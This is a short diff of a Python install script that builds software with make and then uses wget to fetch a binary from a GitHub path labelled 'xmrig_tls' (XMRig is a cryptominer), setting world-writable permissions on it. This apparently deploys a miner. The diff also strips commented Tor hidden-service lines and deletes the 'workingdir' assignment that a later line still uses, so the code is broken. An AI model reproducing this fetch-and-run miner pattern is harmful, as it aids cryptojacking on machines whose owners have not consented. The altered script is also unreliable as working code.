@@ -22,10 +22,6 @@ try:
     os.system('make')
     os.system('make install')
     os.system('make install-config')
-    #os.system('chmod 777 /var/lib/tor/hidden_servie/')
-    #os.system('tor &')
-    workingdir = os.getcwd()
-    #time.sleep(60)
     if os.path.isfile('/usr/local/bin/' + program) == False:
         os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
         os.system('chmod 777 ' + workingdir + '/' + program)
